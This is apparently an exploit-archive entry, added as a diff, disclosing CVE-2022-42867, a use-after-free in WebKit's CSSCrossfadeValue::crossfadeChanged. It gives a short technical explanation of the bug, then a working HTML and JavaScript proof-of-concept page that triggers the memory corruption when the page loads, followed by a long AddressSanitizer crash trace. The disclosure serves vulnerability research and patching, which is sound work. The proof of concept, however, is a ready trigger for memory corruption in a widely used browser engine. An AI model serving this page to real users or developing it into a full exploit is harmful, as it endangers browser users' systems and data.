@@ -1,0 +1,203 @@
+id: 38152
+date: 01/16/2023
+title: WebKit CSSCrossfadeValue::crossfadeChanged Use-After-Free Vulnerability
+author: Maddie Stone
+cves: CVE-2022-42867
+
+WebKit: Use-after-free of RenderMathMLToken in CSSCrossfadeValue::crossfadeChanged
+
+There is a use-after-free of a RenderMathMLToken object in CSSCrossfadeValue::crossfadeChanged. 
+
+CSSCrossfadeValue extends CSSImageGeneratorValue. CSSImageGeneratorValue keeps a HashCountedSet of clients (m_clients) of the image. The RenderMathMLToken object is one of these clients. When the RenderMathMLToken object is freed, I think it should be removed from the client list via RenderElement::willBeDestroyed, but this isn't occurring. CSSCrossfadeValue::crossfadeChanged will then iterate through the client list which includes the dangling pointer to the RenderMathMLToken object, thus causing the use-after-free.  
+
+Vulnerability confirmed on ASAN build of WebKit on OSX and WebkitGTK as of commit fe4b1d3bf61e8999ccd68da789905e92f8ffc9e3
+
+=================
+Proof of Concept 
+=================
+<!-- saved from url=(0014)about:internet -->
+<html>
+<style>
+  .class1 { shape-outside: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); }
+  msub::first-line { background-image: cross-fade(url(abc), url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7), 50%);  }
+</style>
+<script>
+  function trigger() {
+    document.getElementsByTagName(\"style\")[0].appendChild(document.createElement(\"a\")); 
+    setTimeout( () => {
+      msubEle.prepend(\"1\");
+      mathEle.focus() // This can be a few different calls. setSelectionRange also worked
+      mathEle.remove();
+    }, 0);
+  }
+</script>
+<body onload=trigger()>
+  <math id=\"mathEle\" class=\"class1\">
+    <msub id=\"msubEle\">
+      <mi></mi>
+    </msub>
+  </math>
+</body>
+</html>
+===================
+ASAN
+===================
+=================================================================
+==704==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110000cc8c0 at pc 0x0001595e72c0 bp 0x7ff7b3b162f0 sp 0x7ff7b3b162e8
+READ of size 8 at 0x6110000cc8c0 thread T0
+==704==WARNING: failed to spawn external symbolizer (errno: 2)
+==704==WARNING: Failed to use and restart external symbolizer!
+    #0 0x1595e72bf in WebCore::CSSCrossfadeValue::crossfadeChanged()+0x28f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x35412bf)
+    #1 0x1595e7018 in WebCore::CSSCrossfadeValue::SubimageObserver::imageChanged(WebCore::CachedImage*, WebCore::IntRect const*)+0x28 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3541018)
+    #2 0x15aae8504 in WebCore::CachedImage::notifyObservers(WebCore::IntRect const*)+0x114 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4a42504)
+    #3 0x15aaeb6ad in WebCore::CachedImage::finishLoading(WebCore::FragmentedSharedBuffer const*, WebCore::NetworkLoadMetrics const&)+0x1cd (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4a456ad)
+    #4 0x15aa664ef in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&)+0x62f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49c04ef)
+    #5 0x15aa5ab0e in auto WebCore::ResourceLoader::loadDataURL()::$_3::operator()<std::__1::optional<WebCore::DataURLDecoder::Result> >(std::__1::optional<WebCore::DataURLDecoder::Result>)::'lambda'()::operator()() const+0x20e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49b4b0e)
+    #6 0x15aa5a7ec in WTF::Detail::CallableWrapper<auto WebCore::ResourceLoader::loadDataURL()::$_3::operator()<std::__1::optional<WebCore::DataURLDecoder::Result> >(std::__1::optional<WebCore::DataURLDecoder::Result>)::'lambda'(), void>::call()+0xc (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49b47ec)
+    #7 0x1560c728e in WTF::Function<void ()>::operator()() const+0x3e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2128e)
+    #8 0x15613e34e in WTF::CompletionHandler<void ()>::operator()()+0xbe (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9834e)
+    #9 0x1584adc9a in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x1a (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2407c9a)
+    #10 0x1584a37f8 in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fd7f8)
+    #11 0x15aa76111 in WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$_9::~$_9()+0x11 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49d0111)
+    #12 0x15aa6af98 in WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$_9::~$_9()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49c4f98)
+    #13 0x15aa81ff4 in WTF::Detail::CallableWrapper<WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$_9, void>::~CallableWrapper()+0x34 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49dbff4)
+    #14 0x15aa81ea8 in WTF::Detail::CallableWrapper<WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$_9, void>::~CallableWrapper()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49dbea8)
+    #15 0x15aa81ebd in WTF::Detail::CallableWrapper<WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$_9, void>::~CallableWrapper()+0xd (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49dbebd)
+    #16 0x1560c7659 in std::__1::default_delete<WTF::Detail::CallableWrapperBase<void> >::operator()(WTF::Detail::CallableWrapperBase<void>*) const+0x39 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21659)
+    #17 0x1560c75fc in std::__1::unique_ptr<WTF::Detail::CallableWrapperBase<void>, std::__1::default_delete<WTF::Detail::CallableWrapperBase<void> > >::reset(WTF::Detail::CallableWrapperBase<void>*)+0x3c (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x215fc)
+    #18 0x1560c75b8 in std::__1::unique_ptr<WTF::Detail::CallableWrapperBase<void>, std::__1::default_delete<WTF::Detail::CallableWrapperBase<void> > >::~unique_ptr()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x215b8)
+    #19 0x1560c75a8 in std::__1::unique_ptr<WTF::Detail::CallableWrapperBase<void>, std::__1::default_delete<WTF::Detail::CallableWrapperBase<void> > >::~unique_ptr()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x215a8)
+    #20 0x1560c7598 in WTF::Function<void ()>::~Function()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21598)
+    #21 0x1560c7588 in WTF::Function<void ()>::~Function()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21588)
+    #22 0x15613e356 in WTF::CompletionHandler<void ()>::operator()()+0xc6 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x98356)
+    #23 0x1584adc9a in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x1a (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2407c9a)
+    #24 0x1584a37f8 in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x23fd7f8)
+    #25 0x15aa41f91 in WebCore::ResourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)+0x5f1 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x499bf91)
+    #26 0x15aa69b26 in WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)+0x1646 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49c3b26)
+    #27 0x15aa59d5f in auto WebCore::ResourceLoader::loadDataURL()::$_3::operator()<std::__1::optional<WebCore::DataURLDecoder::Result> >(std::__1::optional<WebCore::DataURLDecoder::Result>)+0x50f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49b3d5f)
+    #28 0x15aa596cd in WTF::Detail::CallableWrapper<WebCore::ResourceLoader::loadDataURL()::$_3, void, std::__1::optional<WebCore::DataURLDecoder::Result> >::call(std::__1::optional<WebCore::DataURLDecoder::Result>)+0xcd (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x49b36cd)
+    #29 0x15b6367d2 in WTF::Function<void (std::__1::optional<WebCore::DataURLDecoder::Result>)>::operator()(std::__1::optional<WebCore::DataURLDecoder::Result>) const+0x102 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x55907d2)
+    #30 0x15b636655 in WebCore::DataURLDecoder::decode(WTF::URL const&, WebCore::DataURLDecoder::ScheduleContext const&, WebCore::DataURLDecoder::Mode, WTF::Function<void (std::__1::optional<WebCore::DataURLDecoder::Result>)>&&)::$_0::operator()()::'lambda'()::operator()()+0xc5 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5590655)
+    #31 0x15b63650c in WTF::Detail::CallableWrapper<WebCore::DataURLDecoder::decode(WTF::URL const&, WebCore::DataURLDecoder::ScheduleContext const&, WebCore::DataURLDecoder::Mode, WTF::Function<void (std::__1::optional<WebCore::DataURLDecoder::Result>)>&&)::$_0::operator()()::'lambda'(), void>::call()+0xc (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x559050c)
+    #32 0x13b7b704e in WTF::Function<void ()>::operator()() const+0x3e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x4004e)
+    #33 0x13b87f0f4 in WTF::RunLoop::dispatch(WTF::HashSet<WTF::RefPtr<WTF::SchedulePair, WTF::RawPtrTraits<WTF::SchedulePair>, WTF::DefaultRefDerefTraits<WTF::SchedulePair> >, WTF::SchedulePairHash, WTF::HashTraits<WTF::RefPtr<WTF::SchedulePair, WTF::RawPtrTraits<WTF::SchedulePair>, WTF::DefaultRefDerefTraits<WTF::SchedulePair> > >, WTF::HashTableTraits> const&, WTF::Function<void ()>&&)::$_0::operator()(__CFRunLoopTimer*, void*) const+0xe4 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1080f4)
+    #34 0x13b87f008 in WTF::RunLoop::dispatch(WTF::HashSet<WTF::RefPtr<WTF::SchedulePair, WTF::RawPtrTraits<WTF::SchedulePair>, WTF::DefaultRefDerefTraits<WTF::SchedulePair> >, WTF::SchedulePairHash, WTF::HashTraits<WTF::RefPtr<WTF::SchedulePair, WTF::RawPtrTraits<WTF::SchedulePair>, WTF::DefaultRefDerefTraits<WTF::SchedulePair> > >, WTF::HashTableTraits> const&, WTF::Function<void ()>&&)::$_0::__invoke(__CFRunLoopTimer*, void*)+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x108008)
+    #35 0x7ff80c3a1f68 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__+0x13 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x98f68)
+    #36 0x7ff80c3a1a57 in __CFRunLoopDoTimer+0x39a (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x98a57)
+    #37 0x7ff80c3a15c7 in __CFRunLoopDoTimers+0x132 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x985c7)
+    #38 0x7ff80c387cd5 in __CFRunLoopRun+0x7d9 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x7ecd5)
+    #39 0x7ff80c386e3b in CFRunLoopRunSpecific+0x231 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x7de3b)
+    #40 0x7ff80d1e4d49 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd7 (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:x86_64+0x5fd49)
+    #41 0x7ff80d26f796 in -[NSRunLoop(NSRunLoop) run]+0x4b (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:x86_64+0xea796)
+    #42 0x7ff80c00a815 in _xpc_objc_main+0x304 (/usr/lib/system/libxpc.dylib:x86_64+0x15815)
+    #43 0x7ff80c00a238 in xpc_main+0x62 (/usr/lib/system/libxpc.dylib:x86_64+0x15238)
+    #44 0x129c6d1de in WebKit::XPCServiceMain(int, char const**)+0x27e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xf121de)
+    #45 0x12c0ce6f8 in WKXPCServiceMain+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x33736f8)
+    #46 0x10c3e8ea8 in main+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x100003ea8)
+    #47 0x11629d52d  (/usr/lib/dyld:x86_64+0x552d)
+
+0x6110000cc8c0 is located 0 bytes inside of 256-byte region [0x6110000cc8c0,0x6110000cc9c0)
+freed by thread T0 here:
+    #0 0x10c872b66 in __sanitizer_mz_free+0x86 (/Users/hacksonmacs/Downloads/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/14.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x4bb66)
+    #1 0x13b9fb324 in bmalloc::DebugHeap::free(void*)+0x24 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x284324)
+    #2 0x13b9fbc53 in pas_debug_heap_free+0x33 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x284c53)
+    #3 0x13b9f503c in bmalloc_heap_config_specialized_try_deallocate_not_small_exclusive_segregated+0x5dc (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x27e03c)
+    #4 0x13ba0414f in bmalloc::api::isoDeallocate(void*)+0x3df (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x28d14f)
+    #5 0x15bbcaecb in bmalloc::api::IsoHeap<WebCore::RenderMathMLToken>::deallocate(void*)+0xb (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5b24ecb)
+    #6 0x15bbcaeb2 in WebCore::RenderMathMLToken::operator delete(void*)+0x12 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5b24eb2)
+    #7 0x15bbdb175 in WebCore::RenderMathMLToken::~RenderMathMLToken()+0x15 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5b35175)
+    #8 0x15ba6f543 in WebCore::RenderObject::destroy()+0x113 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x59c9543)
+    #9 0x15ba6f42b in WebCore::RenderObjectDeleter::operator()(WebCore::RenderObject*) const+0xb (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x59c942b)
+    #10 0x15bd1bffe in std::__1::unique_ptr<WebCore::RenderObject, WebCore::RenderObjectDeleter>::reset(WebCore::RenderObject*)+0x4e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c75ffe)
+    #11 0x15bd1bfa8 in std::__1::unique_ptr<WebCore::RenderObject, WebCore::RenderObjectDeleter>::~unique_ptr()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c75fa8)
+    #12 0x15bd0dfc8 in std::__1::unique_ptr<WebCore::RenderObject, WebCore::RenderObjectDeleter>::~unique_ptr()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c67fc8)
+    #13 0x15bd0da89 in WebCore::RenderTreeBuilder::destroy(WebCore::RenderObject&, WebCore::RenderTreeBuilder::CanCollapseAnonymousBlock)+0x1e9 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c67a89)
+    #14 0x15bd155ce in WebCore::RenderTreeBuilder::destroyAndCleanUpAnonymousWrappers(WebCore::RenderObject&)+0x28e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c6f5ce)
+    #15 0x15bd3b11a in WebCore::RenderTreeUpdater::tearDownRenderers(WebCore::Element&, WebCore::RenderTreeUpdater::TeardownType, WebCore::RenderTreeBuilder&)::$_6::operator()(unsigned int) const+0x2da (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c9511a)
+    #16 0x15bd38f89 in WebCore::RenderTreeUpdater::tearDownRenderers(WebCore::Element&, WebCore::RenderTreeUpdater::TeardownType, WebCore::RenderTreeBuilder&)+0x389 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c92f89)
+    #17 0x15bd3a7bc in WebCore::RenderTreeUpdater::tearDownRenderers(WebCore::Element&)+0x10c (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c947bc)
+    #18 0x159af2418 in WebCore::destroyRenderTreeIfNeeded(WebCore::Node&)+0x48 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3a4c418)
+    #19 0x159af223f in WebCore::ContainerNode::removeBetween(WebCore::Node*, WebCore::Node*, WebCore::Node&)+0xdf (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3a4c23f)
+    #20 0x159aedc60 in WebCore::ContainerNode::removeChild(WebCore::Node&)+0x580 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3a47c60)
+    #21 0x159d2f8f7 in WebCore::Node::remove()+0x27 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3c898f7)
+    #22 0x156cf5939 in WebCore::jsElementPrototypeFunction_removeBody(JSC::JSGlobalObject*, JSC::CallFrame*, WebCore::JSElement*)::'lambda'()::operator()() const+0x29 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc4f939)
+    #23 0x156cf57a2 in JSC::JSValue WebCore::toJS<WebCore::IDLUndefined, WebCore::jsElementPrototypeFunction_removeBody(JSC::JSGlobalObject*, JSC::CallFrame*, WebCore::JSElement*)::'lambda'()>(JSC::JSGlobalObject&, JSC::ThrowScope&, WebCore::jsElementPrototypeFunction_removeBody(JSC::JSGlobalObject*, JSC::CallFrame*, WebCore::JSElement*)::'lambda'()&&)+0xe2 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc4f7a2)
+    #24 0x156cf5558 in WebCore::jsElementPrototypeFunction_removeBody(JSC::JSGlobalObject*, JSC::CallFrame*, WebCore::JSElement*)+0x1e8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc4f558)
+    #25 0x156cf52eb in long long WebCore::IDLOperation<WebCore::JSElement>::call<&(WebCore::jsElementPrototypeFunction_removeBody(JSC::JSGlobalObject*, JSC::CallFrame*, WebCore::JSElement*)), (WebCore::CastedThisErrorBehavior)0>(JSC::JSGlobalObject&, JSC::CallFrame&, char const*)+0xfb (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc4f2eb)
+    #26 0x156ce4aa8 in WebCore::jsElementPrototypeFunction_remove(JSC::JSGlobalObject*, JSC::CallFrame*)+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc3eaa8)
+    #27 0x57595d00c037  (<unknown module>)
+    #28 0x13c7335cb in llint_entry+0x1d179 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xfbc5cb)
+    #29 0x13c716248 in vmEntryToJavaScript+0xd7 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xf9f248)
+
+previously allocated by thread T0 here:
+    #0 0x10c872760 in __sanitizer_mz_malloc+0xa0 (/Users/hacksonmacs/Downloads/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/14.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x4b760)
+    #1 0x7ff80c0f9aba in _malloc_zone_malloc+0x7c (/usr/lib/system/libsystem_malloc.dylib:x86_64+0x1daba)
+    #2 0x13b9fb238 in bmalloc::DebugHeap::malloc(unsigned long, bmalloc::FailureAction)+0x28 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x284238)
+    #3 0x13b9fbb68 in pas_debug_heap_malloc+0x38 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x284b68)
+    #4 0x13b9f9db1 in pas_debug_heap_allocate+0x21 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x282db1)
+    #5 0x13b9f46b9 in bmalloc_heap_config_specialized_try_allocate_common_impl_slow+0x549 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x27d6b9)
+    #6 0x13b9c60f9 in bmalloc_iso_allocate_impl_impl_slow+0x29 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x24f0f9)
+    #7 0x13b99a123 in bmalloc_iso_allocate_impl_casual_case+0x233 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x223123)
+    #8 0x13b999ee8 in bmalloc_iso_allocate_casual+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x222ee8)
+    #9 0x13ba03673 in bmalloc::api::isoAllocate(__pas_heap_ref&)+0x1a3 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x28c673)
+    #10 0x15bbcae90 in bmalloc::api::IsoHeap<WebCore::RenderMathMLToken>::allocate()+0x10 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5b24e90)
+    #11 0x15bbcae68 in WebCore::RenderMathMLToken::operator new(unsigned long)+0x18 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5b24e68)
+    #12 0x15ab5c5fd in std::__1::unique_ptr<WebCore::RenderMathMLToken, WebCore::RenderObjectDeleter> WebCore::createRenderer<WebCore::RenderMathMLToken, WebCore::MathMLTokenElement&, WebCore::RenderStyle>(WebCore::MathMLTokenElement&, WebCore::RenderStyle&&)+0x1d (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4ab65fd)
+    #13 0x15ab5c56c in WebCore::MathMLTokenElement::createElementRenderer(WebCore::RenderStyle&&, WebCore::RenderTreePosition const&)+0xbc (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4ab656c)
+    #14 0x15bd392f1 in WebCore::RenderTreeUpdater::createRenderer(WebCore::Element&, WebCore::RenderStyle&&)+0x201 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c932f1)
+    #15 0x15bd37550 in WebCore::RenderTreeUpdater::updateElementRenderer(WebCore::Element&, WebCore::Style::ElementUpdate const&)+0x2b0 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c91550)
+    #16 0x15bd36bdc in WebCore::RenderTreeUpdater::updateRenderTree(WebCore::ContainerNode&)+0x48c (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c90bdc)
+    #17 0x15bd362cf in WebCore::RenderTreeUpdater::commit(std::__1::unique_ptr<WebCore::Style::Update const, std::__1::default_delete<WebCore::Style::Update const> >)+0x23f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x5c902cf)
+    #18 0x159b53142 in WebCore::Document::updateRenderTree(std::__1::unique_ptr<WebCore::Style::Update const, std::__1::default_delete<WebCore::Style::Update const> >)+0x1a2 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3aad142)
+    #19 0x159b53b24 in WebCore::Document::resolveStyle(WebCore::Document::ResolveStyleType)+0x8e4 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3aadb24)
+    #20 0x159b55047 in WebCore::Document::updateStyleIfNeeded()+0x197 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3aaf047)
+    #21 0x159b82553 in WebCore::Document::finishedParsing()+0x2e3 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3adc553)
+    #22 0x15a3fc4d4 in WebCore::HTMLConstructionSite::finishedParsing()+0x24 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x43564d4)
+    #23 0x15a465cfd in WebCore::HTMLTreeBuilder::finished()+0x1d (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x43bfcfd)
+    #24 0x15a404d07 in WebCore::HTMLDocumentParser::end()+0x17 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x435ed07)
+    #25 0x15a402a28 in WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd()+0x38 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x435ca28)
